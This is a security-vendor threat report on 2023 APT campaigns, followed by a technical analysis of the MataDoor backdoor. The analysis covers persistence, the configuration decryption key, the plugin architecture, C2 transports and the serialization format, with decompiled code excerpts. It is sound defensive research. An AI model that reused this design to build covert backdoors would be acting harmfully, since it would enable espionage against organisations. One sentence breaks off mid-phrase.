Early in June, we issued an early warning of a long-standing campaign that we track under the name Operation Triangulation, involving a previously unknown iOS malware platform distributed via zero-click iMessage exploits. Kaspersky employees were also affected by this threat. In addition to reaching out to industry partners to assess the prevalence of this threat, we provided a forensic methodology to help readers determine whether their organization is targeted by the unknown group behind these attacks. We subsequently published a utility to check for indicators of compromise (IoCs).
Following this, we released the first of a series of additional reports describing the final payload in the infection chain: a highly sophisticated spyware implant that we dubbed “TriangleDB”. Operating in memory, this implant periodically communicates with the C2 (command and control) infrastructure to receive commands. The implant allows attackers to browse and modify device files, get passwords and credentials stored in the keychain, retrieve geo-location information, as well as execute additional modules, further extending their control over the compromised devices.
Russian-speaking activity
The Russo-Ukrainian conflict has ignited the movement of multiple factions around the world. Cyberattacks have spiked and various hacktivist groups have taken sides. Arising from the flames of this physical conflict, Killnet emerged as a group primarily focused on selling access to its stressor service. Driven by nationalist ideals and motivations, it swiftly gained prominence as one of the most influential hacktivist groups aligned with pro-Russian sentiments. Killnet, led by a person nicknamed “KillMilk”, is one of the leaders of the hacktivist movement that uses DDoS as a means of disruption. Backed by numerous allies and a growing fan base that provides support, Killnet has successfully targeted multiple entities affiliated with NATO or providing support to Ukraine in the ongoing conflict. Its recent attacks have extended to US healthcare organizations, while also leaking documents from various entities in an effort to cause both psychological and organizational repercussions among its adversaries. Our private report delved into the origins of Killnet: how it emerged; the tools of its trade; the communication channels it uses; its allies and adversaries and the groups it collaborates with; the monetary support that enables the group and its leader to sustain its activities; and the current and future direction of the group.
Chinese-speaking activity
ToddyCat, a sophisticated threat actor, continues to operate in Asia, targeting government entities in Malaysia, Thailand and Pakistan. The group’s latest activities, from September 2022 until March 2023, involve a new set of custom loaders and its private post-exploitation tool “Ninja,” used to help it remain undetected. In the past year, ToddyCat has updated its toolset to avoid detection and reduce the number of targets. We now have better visibility into the group’s tactics, particularly in the areas of lateral movement, data collection and exfiltration. Additionally, ToddyCat has started using Cloudflare workers as C2 servers, aligning with a trend we’ve observed among other threat actors.
We also reported on ToddyCat Sylo, where the group introduced additional collection and exfiltration tools and used previously compromised user accounts with high privileges for lateral movement. Several tools were used to gather documents. The first, “LoFiSe”, packs files into a ZIP archive. The second is a PowerShell script that uses WinRAR to exfiltrate files. After collecting the data, archives with files were sent to OneDrive using another tool, “Pcexter”.
Spanish-speaking activity
We’ve seen constant activity from the KelvinSecurity team over the past few years, dating back to 2015. The group has described itself as hacktivist and “grey hat” security oriented, and has sold and leaked databases, documents, and access belonging to entities worldwide. These attacks are occasionally motivated by activist factors or financial gain. In our private report, we presented an overview of previous and current attacks, the group’s objectives, and its methodologies. We explored the group’s infrastructure as a way of understanding how it shares its leaks, and provided insight into the group’s leadership and potential perpetrators.
We discovered a BlindEagle espionage campaign targeting government entities in Colombia, active since at least March of this year. BlindEagle has established a reputation for targeting institutions and corporations in South America, primarily engaging in cyber-espionage activities, while also engaging in financial information theft. In a recent report, we highlighted an incident where the threat actor utilized a modified version of the Quasar RAT, repurposing it as a banking Trojan to specifically target customers of financial entities in Colombia. However, in its latest campaign, BlindEagle has shifted its focus to another open-source RAT known as “njRAT”, with the primary objective of conducting espionage on its victims. Our analysis delved into BlindEagle’s most recent espionage campaign, covering the entire infection flow from the initial spear-phishing emails to the deployment of the njRAT implant.
Middle East
We recently obtained JackalControl C2 communications from a campaign targeting government entities in Iran, active until early April 2023. The server response we gathered sheds light on the threat actor’s methodology for profiling victims, how it deploys and configures the JackalSteal component, and what types of files are deemed interesting. GoldenJackal, an APT group we discovered in 2020, primarily targets high-profile entities in the Middle East and South Asia. Over the years, we have closely monitored its activities and have published multiple reports detailing its TTPs and toolset.
Our monitoring activities also uncovered two new malware samples, named “JackalPerInfo” and “JackalScreenWatcher”, which we have linked to GoldenJackal and which we suspect have been part of their toolset since 2020. These tools are used in the post-exploitation stage of an attack, gathering screenshots and various files from an infected host. The samples were discovered on a system that was not protected by our products and scanned with our free Kaspersky Virus Removal Tool, which correctly detected and removed the threat. We believe that GoldenJackal targets only unprotected systems or systems without Kaspersky protection. Our report provided details on these new components, shedding further light on GoldenJackal’s toolset and TTPs.
On April 26, a third party publicly described BellaCiao (a malicious script dropper) and associated it with Charming Kitten (aka APT35). We retrieved several BellaCiao samples, including undocumented variants, and provided additional IoCs, as well as contextual information on related malicious activities and tools. The threat actor probably leveraged vulnerabilities on internet-facing servers to deploy BellaCiao. The operations date back to at least May 2022, and malicious infrastructure analysis indicates possible operations starting in 2021. While the threat actor has mostly deployed Plink to establish tunnels between malicious infrastructure and targeted servers, it also leveraged the open-source tool “bore”, written in Rust. We identified WatchMaster, a possibly related tool that attempts to dynamically delete ASP .NET files, except for some web shells on IIS servers. Our telemetry indicates that BellaCiao has been used against targets in Afghanistan, Austria, Israel and Turkey since at least November 2022. Additionally, the content of some samples suggests the implant was probably used to target organizations in Italy. The threat actor used BellaCiao to reach RDP servers and harvest credentials from compromised organizations.
In a previous report on the OilRig APT, we analyzed a targeted attack on an IT company in Jordan in August 2022, in a probable supply-chain attack on government institutions. That intrusion went silent in September 2022, and resurfaced with updated tools around November 2022, before going silent again. Recently we came across a new set of samples that resemble the previous intrusion in Jordan and with similar TTPs. However, this time we believe the infection took place at an IT company in the UAE. Our report highlighted the developments in the new intrusion to drop the initial loaders; and provided an assessment of what to expect from such intrusions in the near future.
Southeast Asia and Korean Peninsula
In early September 2022, our team discovered several malware detections from the MATA cluster, previously attributed to the Lazarus group, targeting defense contractors in Eastern Europe. This campaign remained active until March 2023. Expanding the scope of our research, we investigated and discovered additional new, active campaigns with full infection chains, including an implant designed to work in air-gapped networks via USB sticks, as well as a Linux MATA backdoor. The new, updated MATA malware was distributed using spear-phishing techniques, with the attackers deploying their malware in multiple stages using validators. The threat actor also abused various security and anti-malware solutions used by the victims. The new MATA orchestrator introduced several modifications to its encryption, configuration and communication protocols and appears to have been rewritten from scratch. The next generation of MATA includes new functionality to circumvent network restrictions, allowing the actor to build complex proxy chains within the victims’ network, and to create a ‘stack’ of various communication protocols to be used for C2 communications.
We also discovered a new variant, MATAv5. This sophisticated malware, completely rewritten from scratch, exhibits an advanced and complex architecture that makes use of loadable and embedded modules and plugins. MATAv5 is capable of functioning as both a service and a DLL within different processes. The malware leverages Inter-Process Communication (IPC) channels internally and employs a diverse range of commands, enabling it to establish proxy chains across various protocols, including within the victim’s environment. While MATAv5 has undergone substantial evolution, and shares minimal code with its predecessors, there are still similarities in terms of protocols, commands, and plugin structures. These similarities suggest a consistent approach to functionality across different generations of the malware.
We have been tracking an unknown malware cluster, dubbed “ScoutEngine”. Initially, we found no similarities with known malware or threat actors. However, upon closer inspection of the entire malware, we discovered that this malware has been in continuous development since 2020. ScoutEngine has several numbered versions from 2.1 to 2.3. Each version has a different infection scheme, and the malware author has updated the method for retrieving the next stage payload and configuration data, decryption key, and C2 communication formats as the versions have evolved. ScoutEngine’s objective is to fetch additional payloads based on the attacker’s commands and execute them in memory. Unfortunately, we are currently unable to determine the final payload. Ultimately, we were able to confidently conclude that the Lazarus group is responsible for the ScoutEngine cluster. Its components and configurations closely resemble those of Lazarus malware: in particular, ScoutEngine employs an unusual method, previously observed in the CookieTime malware, to generate a registry path and acquire configuration data.
On March 29, CrowdStrike issued an alert about a supply-chain attack affecting the popular 3CXDesktopApp VoIP software. In their report, they tentatively attributed the ongoing attack to Lazarus. While investigating campaigns related to the 3CX attack, we uncovered evidence of another supply-chain attack targeting the X_TRADING software developed by Trading Technologies. This attack has been ongoing since late 2021 and shares similarities with the 3CX campaign. We notified Trading Technologies of the compromise of its web service assets on March 31 this year, and included guidance on how to handle the situation. Furthermore, we discovered that the actor behind the 3CX attack, which we also believe to be Lazarus with medium-high confidence, is using a backdoor that we have named Gopuram‘ to target selected victims of the 3CX intrusion. Our analysis of Gopuram dates back to 2020 when we first encountered it on compromised systems alongside the AppleJeus malware known to be associated with Lazarus.
We discovered a recent BlueNoroff campaign that implements new malware delivery methods using Trojanized PDF readers, targeting both Windows and macOS systems using the same infection method. It appears that the actor distributed the Trojanized PDF reader along with a specially crafted PDF file. The malware is designed to execute only when the victim opens the malicious PDF file. Once opened, the PDF reader retrieves the offset of the decoy PDF document and the C2 URL from the PDF file. Our research has shown that the decoy documents used in this attack are related to venture capital and investigative reports from government agencies. Once the malware successfully retrieves this information, it sends the victim’s data to the remote server and initiates the execution of additional payloads delivered from the attacker’s servers. This is the first time thay BlueNoroff group has implemented macOS malware. Moreover, the group utilized compiled AppleScript during the initial stage of the attack, while the malware retrieved by the Trojanized PDF reader was created using the Rust programming language. This is the first time the BlueNoroff group has used Rust for its malware. As the target environment is diverse, the BlueNoroff group has employed additional programming languages and methodologies to efficiently deliver its malware.
The Asia-Pacific region has been a hotspot for cyberattacks by various threat actors for the past couple of years. Among the many APT actors active in this region, a number of them focus on Pakistani victims. We recently discovered a cluster of activity in this region focusing on a similar victim profile. We published two private reports on this threat actor, which we have named “Mysterious Elephant”. The first report highlighted the primary TTPs used by this threat actor over the past few years. Some of the tools used by Mysterious Elephant exhibit similarities with older tools that were previously employed by other threat actors in the region. For instance, earlier versions of the Rover backdoor, analyzed in our report, were used by SideWinder and Confucius. The second report focused on the analysis of a campaign targeting a number of victims associated with Pakistan’s foreign affairs. The primary malware utilized in this campaign is a new backdoor family that is dropped onto victims’ machines through a malicious RTF document that exploits the CVE-2017-11882 vulnerability. This document is downloaded via another spear-phishing document that serves as a remote template. The backdoor module establishes communication with its C2 server using Remote Procedure Call (RPC) and has the ability to execute files or commands on the victim’s machine, as well as receive files or commands from the C2 server for execution on the infected computer.
With Microsoft disabling macro-embedded Office documents, threat actors began adopting new malware delivery methods, among them the ScarCruft group, which swiftly changed its initial infection tactics. The group operates two clusters named “Chinotto” and “RokRat”. While they have historically relied heavily on macro-embedded Word documents, they have continuously adopted other file formats, such as compiled HTML (.CHM) and Windows shortcut (.LNK) files. Furthermore, to evade Mark-of-the-Web (MOTW) mitigation, these files were delivered in archive file formats such as .RAR and .ZIP, or in optical disk image (.ISO) file formats. Despite continuous testing of the initial infection vectors, the actors persisted in using the same final payload. The Chinotto cluster still employs the Chinotto PowerShell script as a final payload, which is responsible for executing Windows commands on the victim’s computer. Similarly, the RokRat malware is delivered to the victim through a complicated infection procedure. This shows that the threat actor is putting a lot of effort into the initial infection vector, while still relying on the same final payload.
Final thoughts
While the TTPs of some threat actors remain consistent over time, relying heavily on social engineering to gain a foothold in a target organization or compromise an individual’s device, others have refreshed their toolsets and expanded the scope of their activities. Our regular quarterly reviews are designed to highlight the most significant developments among APT groups.
Here are the top trends we’ve seen in Q2 2023:
•	One of the main highlights of the quarter was the discovery of the long-running Operation Triangulation campaign, including the previously unknown iOS malware platform.
•	We’ve become accustomed to seeing established threat actors enhancing their toolsets over time. So far, this year has been no different – in particular, this includes Lazarus’s development of its MATA framework, the new delivery methods and programming languages used by BlueNoroff, new infection methods used by ScarCruft and new malware samples from GoldenJackal.
•	We also saw a campaign from the newly discovered threat actor Mysterious Elephant.
•	We continue to see threat actors using a variety of different programming languages.
•	APT campaigns continue to be geographically dispersed. This quarter, we saw actors focusing their attacks on Europe, Latin America, the Middle East and various parts of Asia.
•	Geopolitics remains a key driver of APT development, and cyber-espionage continues to be a prime goal of APT campaigns.
As always, we would note that our reports are the product of our visibility into the threat landscape. However, it should be borne in mind that, while we strive to continually improve, there is always the possibility that other sophisticated attacks may fly under our radar.
Disclaimer: when referring to APT groups as Russian-speaking, Chinese-speaking or “other-speaking” languages, we refer to various artefacts used by the groups (such as malware debugging strings, comments found in scripts, etc.) containing words in these languages, based on the information we obtained directly or that is otherwise publicly known and widely reported. The use of certain languages does not necessarily indicate a specific geographic relation, but rather points to the languages that the developers behind these APT artefacts use.
 
Dark River. You can't see them, but they're there
Published on 27 September 2023
Contents
•	Introduction
•	Initial infection vector
•	MataDoor. Description of the backdoor
o	1. Launching and persistence
o	2. High-level architecture
o	3. Plugins
	3.1. Functional plugins
	3.2. Transport (network) plugins
o	4. Asynchronous operations
o	5. Serialization mechanism
o	6. General workflow of the backdoor
	6.1. Initialization
	6.2. Establishing connection
	6.3. Command receiving and processing cycle
o	7. Deferred commands
o	8. Descriptions of plugins
	8.1. Management
	8.2. Remote Shell
	8.3. Processes
	8.4. Filesystem
	8.5. Netscan
	8.6. Bridge
o	9. Network subsystem architecture
	9.1. Overview of the transport subsystem components
	9.2. Creating transport interfaces and connections. Configuring connections
	9.3. Specific transports
	9.4. Application-layer transports
•	Conclusion
•	Applications
o	Verdicts by Positive Technologies products
o	MITRE
o	IOCs
Introduction
In October 2022, during an investigation into an incident at a Russian industrial enterprise, samples of previously unseen malware were discovered running on compromised computers of this organization. The names of this malware’s executable files were similar to the names of legitimate software installed on the infected machines, and a number of samples had valid digital signatures. Also, the identified executable files and libraries were processed by the Themida protector to make them more difficult to detect and analyze.
Subsequent analysis of these samples revealed that the identified software is a fairly complex modular backdoor, which we called MataDoor, designed for long-term covert operation in the
Initial infection vector
We presume that the initial vector for introducing the backdoor into the compromised system was a phishing email with a DOCX document attached. The content of this document was relevant to the field of operations of the targeted enterprise. This document contained an exploit for the CVE-2021-40444 vulnerability. The complete attack chain could not be reconstructed from this document; however, the correlation between the time the backdoor activity began and the time the email was sent strongly suggests that this malicious document was the source of the backdoor.
This email is not unique. Similar emails containing documents with exploits for the CVE-2021-40444 vulnerability were sent to Russian defense industry enterprises in August—September 2022. The content of some of them was related to the activities of the attacked enterprises, while others were simply designed to attract the attention of the recipient. All the letters encouraged the user to enable editing in the document, which is a necessary condition for running the exploit.
Below are examples of the documents related to the enterprise’s activities:
 
 
The font used in the above documents forces the user to enable editing and change the color to make it more visible. When editing is enabled, a malicious payload is loaded and executed from an attacker-controlled resource, exploiting the CVE-2021-40444 vulnerability. The actual payload could not be obtained because the servers containing it were inaccessible at the time of the investigation.
The documents that simply aimed to attract the recipient’s attention looked like this:
 
When analyzing the properties of these documents, it was discovered that the URL from which the exploit payload is loaded is HTML-encoded:
 
It should be noted that in the analysis of an array of documents exploiting the CVE-2021-40444 vulnerability, this URL encoding method was found only in these documents, which suggests that these mailings may have the same origin.
There are certain similarities between these emails and the phishing emails sent to Russian defense industry enterprises and discovered in September 2021. Information about them has been published by Malwarebytes (https://www.malwarebytes.com/blog/news/2021/09/mshtml-attack-targets-russian-state-rocket-centre-and-interior-ministry). In this report, there was mention of an email with a DOCX attachment, supposedly sent by the organization’s HR department with a request to fill in the table provided in the document:
 
When editing was enabled, the CVE-2021-40444 vulnerability was exploited, followed by the execution of malicious content.
The September 2021 documents also used HTML encoding for the payload URLs:
 
The same method of encoding the payload URL of the malicious documents suggests that the above-mentioned mailing campaigns from 2021 and 2022 were carried out by the same actor.
There are some additional signs that support this assumption:
•	The payload in the September 2021 campaigns and some instances of the MataDoor backdoor discovered in 2022 were signed with Sectigo certificates.
•	The domain names of the payload servers for all the mentioned malicious documents are all registered by the Namecheap registrar. The C2 domain names for MataDoor are also registered by Namecheap.
•	All the attacks targeted Russian enterprises in the defense industry.
It is notable that the elements of the network infrastructure used in attacks on different organizations do not overlap. The domains’ registrants’ details are hidden.
Some information about the characteristics of the MataDoor backdoor was published by Kaspersky in the "Southeast Asia and Korean Peninsula" section of the APT Trends Report Q2 2023. In that report, this backdoor, named MATAv5, was associated with the Lazarus group’s activity. In our investigation of the network infrastructure used, we were unable to definitively identify the author of this tool. So we assigned the name Dark River to the group that initiated the attack, based on the name River mentioned in the Author field of some of the phishing documents mentioned above.
MataDoor. Description of the backdoor
1. Launching and persistence
The backdoor is a DLL that, in addition to the standard DllMain function, exports the DllRegisterServer function. This allows the payload to be run when called through the standard Windows Regsvr32 program normally used for registering OLE controls in the system registry. In practice, both functions—DllMain and DllRegisterServer—perform the same actions, initializing the backdoor and running its main execution logic in a separate thread.
However, in all known cases, the backdoor is run using an additional component called loader service, which is a Windows service that runs automatically when the system starts, ensuring the backdoor’s persistence in the system. The loader service component does not perform any actions other than launching the DLL with the backdoor, the path of which is defined in its configuration. The loader’s configuration, like the configuration of the backdoor itself, is encrypted using the AES algorithm in cipher feedback (CFB) mode.
In all examined samples, the decryption key for the configuration is the sequence 29 23 BE 84 E1 6C D6 AE 52 90 49 F1 BB E9 EB, which represents the sequence of the first 16 bytes generated by the linear congruential generator X[n] = (0×343fd × X[n-1] + 0×269ec3) mod 0xffffffff with the seed (X[0]) set to 1. This generator corresponds to the implementation of the rand() function from the Microsoft C Runtime standard library.
It’s worth noting that the components of this malware have distinctive compilation names: loaders are named loader_service_raw_win_intel_64_le_RELEASE.dll, while backdoors are named MATA_DLL_DLL_PACK_**********_win_intel_64_le_RELEASE.dll, where ********** represents a specific date. Variants of backdoors with the following compilation names have been investigated:
MATA_DLL_DLL_PACK_20221013_011_win_intel_64_le_RELEASE.dll,
MATA_DLL_DLL_PACK_20221006_011_win_intel_64_le_RELEASE.dll,
MATA_DLL_DLL_PACK_20221013_011_win_intel_64_le_RELEASE.dll.
Given the presence of the string "MATA" in the compilation name, the backdoor was given the name MataDoor.
As previously mentioned, when installing this malware, the attackers choose the names of the loader and backdoor executable files separately for each compromised host, mimicking the file names of legitimate programs deployed on it. For example, if there is a legitimate executable file named 1cv8.dll in the system, the backdoor file name might be 1cv8u.dll.
In many cases, the names of the loader and the backdoor are also similar. For example: dlpsvc.dll (loader filename) and dlpsvcHelper.dll (backdoor filename).
As mentioned earlier, some backdoor and loader instances were signed with Sectigo certificates:
 
2. High-level architecture
The examined sample is a modular backdoor. Architecturally, it consists of a kernel (orchestrator) and modules (plugins). The kernel includes the following functionality:
•	Data serialization mechanism using its own custom format
•	Backdoor configuration management
•	Receiving and processing commands from the C2
•	Mechanism for performing asynchronous operations
•	Plugin management
Let’s take a closer look at each of these components.
 
3. Plugins
The plugins (modules) used by the backdoor are divided into two categories:
•	Functional plugins that implement commands from the C2 that the backdoor can execute.
•	Transport (network) plugins that implement network protocols.
Plugins can either be separate PE modules or be embedded—statically linked with the backdoor. During our investigation we found no separate plugins and examined only embedded ones.
Each plugin has its own identifier, which is unique within the set of plugins in the same category. That is, the identifiers of a transport plugin and a functional one may match, but, for example, the identifiers of two different transport plugins should not match. The identifier is used for registering the plugin in the kernel and for unloading it. Information about the currently registered plugins is maintained by the orchestrator in the form of two lists: one for network plugins and another for functional plugins. Now, let’s examine each of these categories separately.
3.1. Functional plugins
Every functional plugin, regardless of its form, must be registered in the orchestrator’s context. The orchestrator maintains a list of all such plugins, each element of which has the following structure:

    typedef struct
{
    int unknown; // This field was not used in the code.
    int pluginId; // Plugin ID 
    void* pluginModulePtr; // Pointer to the loaded PE module of the plugin 
    UNLOAD_PROC unloadProc; // Pointer to the plugin unload procedure 
    PluginInfo *next;    
} PluginInfo;


The pluginModulePtr field contains a pointer to the loaded PE module of the plugin, analogous to the module handle returned by the LoadLibrary call. For embedded plugins, this field is set to 0. In addition to the plugin itself, the orchestrator must also register handlers for the C2 commands that this plugin implements. Each command, along with its corresponding handler, has a unique identifier within the entire set of commands implemented by the backdoor. The plugin registers the command handlers it implements by calling the corresponding API method provided by the orchestrator. These actions are performed during the plugin initialization procedure. The plugin initialization procedure also tells the orchestrator the plugin’s identifier and the address of the plugin unload procedure. An example of such an initialization procedure is shown below:

    int __fastcall Plugins::Bridge::Init(ORCHESTRATOR *ctx, int *moduleId, void *unloadProc)
{
  if ( (ctx->id - 7) > 0x3E0 )
    return ERR_PROC_NOT_FOUND;
  if ( moduleId )
  {
    Plugins::Bridge::PluginId = *moduleId;
    *moduleId = 5;
  }
  if ( unloadProc )
    *unloadProc = Plugins::Bridge::Unload;
  ctx->RegisterCommandHandler(ctx, 500, Plugins::Bridge::RunBridgedClients);
  ctx->RegisterCommandHandler(ctx, 502, Plugins::Bridge::RunAuthServer);
  ctx->RegisterCommandHandler(ctx, 505, Plugins::Bridge::RunRawServer);
  return 0;
}


This procedure initializes the plugin with the identifier 5, which allows a backdoor instance to act as a relay node for transmitting data between other instances of the backdoor. This functionality is implemented through three commands with identifiers 500, 502, and 505. We discuss this in more detail in the corresponding section.
In terms of input, the command handler receives a pointer to the orchestrator’s context, parameters in serialized form (more on serialization in the corresponding section), and the pointer to the variable for recording the command execution status or error code:

SerializedData *__fastcall CommandHandler(
        ORCHESTRATOR *ctx,
        SerializedData *parameters,
        int *pStatus);


The handler returns the results of command execution in serialized form. The composition of serialized elements is specific to each command.
The plugin unload procedure releases various resources used by the plugin and must also remove the commands implemented by the plugin from the list of active commands, which is also done by calling the corresponding orchestrator API function. An example of such a function for the aforementioned module is presented below:

int __fastcall Plugins::Bridge::Unload(ORCHESTRATOR *ctx)
{
  ctx->UnregisterCommandHandler(ctx, 500);
  ctx->UnregisterCommandHandler(ctx, 502);
  ctx->UnregisterCommandHandler(ctx, 505);
  return 0;
}


3.2. Transport (network) plugins
All network protocols used by the backdoor are implemented in transport plugins. Each of these plugins also has a unique identifier with which it is registered with the orchestrator or unloaded. The orchestrator stores information about the network plugins in use in a separate list, the elements of which have the following structure:

typedef struct
{
    int moduleId; // Plugin ID
    int unknown1; // Always equal to 0.
    int factoryId; // Connection factory ID
    int unknown2; // Not used. 
    void* moduleBase; // Pointer to PE module of the plugin
    void* unloadProc; // Pointer to the plugin unload procedure
    NetworkPluginInfo* next; 
} NetworkPluginInfo;


In addition to the network module identifier itself (moduleId), registration also requires the identifier of an existing connection factory registered in the orchestrator, within which this plugin will operate (parameter factoryId). This allows the factory to create new connections using the protocol implemented by this transport plugin.
If the transport plugin is an embedded one, the moduleBase field is set to 0.
The transport plugin can implement multiple network protocol variants (for example, HTTP and HTTPS). Each implemented protocol variant (or transport in the context of this report) must have its own string identifier (for example, "tcp", "tcp6"), by which it is specified in the network connection configuration string (see the "Transport subsystem overview" section for more details). The mapping between the string identifier and the procedure for creating the corresponding transport is registered in the respective factory using the initialization procedure of the transport plugin provided by the backdoor’s API. Below is an example of the initialization procedure for a network plugin that implements HTTP and HTTPS transports:

int __fastcall HttpTransport::InitProc(
        NETWORK_TRANSPORT_FACTORY **factories,
        int factoryId,
        _DWORD *pStatus,
        _QWORD *unloadProc)
{
  NETWORK_TRANSPORT_FACTORY *factory; // rbx

  factory = *factories;
  if ( !*factories )
    return ERR_BAD_COMMAND;
  while ( factory->identifier != factoryId )
  {
    factory = factory->next;
    if ( !factory )
      return ERR_BAD_COMMAND;
  }
  if ( !HttpTransport::GetTransportDescriptorStatus )
    CreatePipeNoBlockingMode(&HttpTransport::ControlPipeRead, &HttpTransport::ControlPipeTransportEndpoint, 0i64, 0);
  HttpTransport::GetTransportDescriptorStatus = factory->GetTransportDescriptorsStatus;
  factory->RegisterTransportCreationRoutines(factory, aHttp, HttpTransport::HttpTransport);
  factory->RegisterTransportCreationRoutines(factory, aHttps, HttpsTransport::HttpsTransport);
  HttpTransport::RegisterProxyTransportFactories(factory);
  if ( pStatus )
    *pStatus = 1;
  if ( unloadProc )
    *unloadProc = HttpTransport::Unload;
  return 0;
}


The plugin unload procedure removes the transport creation functions from the factory and releases the resources in use. An example of such a procedure for the "http" network plugin:

int __fastcall HttpTransport::UnregisterFactory(NETWORK_TRANSPORT_FACTORY **factoriesList, int factoryId)
{
  NETWORK_TRANSPORT_FACTORY *factory; // rbx

  factory = *factoriesList;
  if ( !*factoriesList )
    return ERR_BAD_COMMAND;
  while ( factory->identifier != factoryId )
  {
    factory = factory->next;
    if ( !factory )
      return ERR_BAD_COMMAND;
  }
  factory->DeleteTransportCreationInfo(factory, "http");
  factory->DeleteTransportCreationInfo(factory, "https");
  factory->DeleteTransportCreationInfo(factory, "proxy_http");
  factory->DeleteTransportCreationInfo(factory, "proxy_https");
  return HttpTransport::FinalizeProcessingConnections();
}


4. Asynchronous operations
Commands that take a long time to execute are executed asynchronously, in a separate thread. The backdoor stores the Information about all current asynchronous operations in a separate global (within the backdoor instance) list. Information about an asynchronous operation is added to the list before the operation starts and removed after its completion. This information has the following structure:

typedef struct
{
     int state; // Operation state. 1: in progress, 2: completed
     int pluginID; // ID of the functional plugin performing the operation
     int unknown1;       
     int workerThreadId; // ID of the thread performing the operation 
     HANDLE hWorkerThread; // Handle of the thread performing the operation
     long startTime; // Start time of the operation in Unix timestamp format 
     int unknown2;
     int operationId; // Operation identifier 
     int unknown3;    
     char* operationDescription; // Not used during execution, presumably description of the operation.  
     void* asyncOperationRun; // Function that directly performs the operation
     void* asyncOperationFinalize; // Function for releasing resources 
     AsyncOperationBasicContext *next; 
} AsyncOperationBasicContext;


Each asynchronous operation has its own identifier operationId, which is not related to the identifier of the command that performs the operation. Multiple operations with the same operationId can be executed simultaneously. In the context of an asynchronous operation, the identifier of the plugin that performs it (pluginID) must be specified to avoid unloading the plugin while it is performing the asynchronous operation. In this case, the backdoor waits for the operation to complete before unloading the plugin.
5. Serialization mechanism
The backdoor extensively utilizes its own data serialization system, which is used, for example, to store configurations for both the backdoor itself and its network connections, as well as to transmit commands and the results of their execution. Data serialization is carried out through an API provided by the backdoor’s kernel.
A serialized storage unit has the following structure:

[data size: 4 bytes, big-endian] [key: 4 bytes, big-endian] [serialized data]


Serialized storage units can be grouped together into arrays, in which case they are treated as a single entity from the backdoor’s perspective.
The serialization key is a DWORD. The high-order word indicates the type of the serialized data, and the low-order word serves as the identifier for the storage unit. The same array can contain multiple units with identical keys. In this case, they are accessed using an additional index.
A total of 14 possible data types are used, ranging from 0×01 to 0×0E. Based on the size of the stored data, these types can be categorized as follows:
•	0×01, 0×06: BYTE
•	0×02, 0×07: WORD
•	0×03,0×08, 0×0B: DWORD
•	0×04, 0×09, 0×0A: QWORD
•	0×05, 0xC, 0xD, 0xE: byte array
All fixed-size values (WORD, DWORD, QWORD) are serialized in big-endian format.
The purpose of some types can be inferred from their usage context:
•	0×1: not encountered in the analyzed code.
•	0×2: network connection port number.
•	0×3: 4-byte storage unit without specific properties.
•	0×4: offset relative to some value, such as the beginning of a file.
•	0×5: cryptographic data (public keys, nonce, hash value, and so on).
•	0×6: not encountered in the analyzed code.
•	0×7: not encountered in the analyzed code.
•	0×8: operation/command execution status.
•	0×9: not encountered in the analyzed code.
•	0×A: temporary attributes of operating system objects (processes, files) in Unix timestamp format.
•	0×B: bitmask.
•	0×C: string.
•	0×D: array of containers.
•	0×E: container, with its data area being an array of other serialized units. Containers allow serialized data to be organized into a hierarchical structure of arbitrary depth.
The API for working with this format includes the following functions:

// Concatenate one serialized storage unit with another so that they are in a single buffer and follow one another sequentially.
SerializedData *__fastcall ConcatItems(SerializedData *dstItem,
                                       SerializedData *srcItem); 
                                       
// Add a storage unit to the container.
SerializedData *__fastcall AddNewItemIntoContainer(SerializedData *container,
                                                   u_long newItemId,
                                                   char *newItemData,
                                                   signed int newItemBufLen,
                                                   DWORD *status); 
// Copy a storage unit. 
SerializedData *__fastcall CopyItem(SerializedData *srcItem);

// Get the size of a storage unit (including headers).
__int64 __fastcall GetItemSize(SerializedData *item);

// Get the number of storage units with the specified key in a container. 
__int64 __fastcall CountItemsInContainer(SerializedData *container,
                                         int itemsKey);

// Get the pointer to the data buffer for the storage unit with the specified key and index. 
SerializedData *__fastcall GetItemDataWithDesiredId(SerializedData *items, 
                                                    int key,
                                                    int itemIndex)

// Get a copy of the storage unit with the specified key and index from a container. 
int __fastcall GetItemDataCopyFromContainer(SerializedData *items, 
                                            unsigned int itemKey,
                                            __int64 index,
                                            _BYTE *dst,
                                            unsigned int dstCapacity);

// Get a pointer to the buffer of the storage unit with the specified key and index from a container.
char *__fastcall FindItemPtrWithDesiredId(SerializedData *items,
                                          int key, 
                                          int itemIndex);

// Create a new container with the specified key.
SerializedData *__fastcall MakeNewContainer(u_long key); 

// Delete the specified storage unit from a container.
__int64 __fastcall DeleteItem(SerializedData *items,
                              int id,
                              int itemsCount);

// Replace the specified storage unit in a container.
SerializedData *__fastcall ReplaceItem(SerializedData *container,
                                       unsigned int key,
                                       int replacedItemIndex,
                                       char *replacementData,
                                       u_long size,
                                       DWORD *status);


6. General workflow of the backdoor
The general workflow of the backdoor is as follows:
6.1. Initialization
During this stage, the backdoor initializes the orchestrator, registers the built-in network and functional plugins, and retrieves its parameters from its configuration. The backdoor’s configuration is a separate block in the initialized data section, encrypted using the AES algorithm in CFB mode with the key mentioned earlier in the "Launching and persistence" section. A pointer to the decrypted configuration is then stored in the orchestrator’s context.
After decrypting the configuration, the backdoor attempts to load the saved configuration. To do this, it extracts from its current configuration the serialized (under the 0xC0037 key) name of a registry key in the HKEY_LOCAL_MACHINE section where the saved configuration is located. When saving, the current configuration is compressed using the LZ4 algorithm and then encrypted with the AES-CFB algorithm, using the same key. If there is no saved configuration—for example, during the first launch—the backdoor uses the configuration extracted from the data section.
Next, a command (key 0xC002F) is extracted from the configuration and executed in the cmd.exe interpreter. In all examined instances of the backdoor, the value of this command in the initial configuration was empty.
6.2. Establishing connection
Next, the backdoor establishes a connection to the C2 based on the network configuration stored in serialized form under the 0xD0033 key. The network configuration may contain several different options for connecting to the C2. In this case, the option used is selected randomly. In the selected connection configuration, its usage counter (serialization key = 0×30035) is increased by 1 and saved. Next, a string that describes the connection to the C2 (serialization key = 0xC0034) is extracted from the selected configuration; based on this string, the backdoor establishes a connection to the C2 and then sends serialized lists of identifiers of all network and functional plugins in use to the C2. The serialization key for the list of functional plugins is 0xD0006; for the network plugin list it’s 0xD0009. Next, the backdoor starts receiving and processing commands. The connection to the C2 uses the agent transport, with authentication of connected clients (see the description of the transport subsystem).
6.3. Command receiving and processing cycle
Commands are transmitted from the C2 to the backdoor in serialized form. The total size of the command is transmitted first (4 bytes, byte order: big-endian), followed by the command itself. The command code has a size of 4 bytes and is serialized with key 0×30005. The data which is obtained during command execution and has to be sent to the C2 is also serialized into the container with key 0xE0002. The code of the operation execution status (key = 0×80003) is also added to this container, and then the result is sent to the C2 and the cycle repeats.
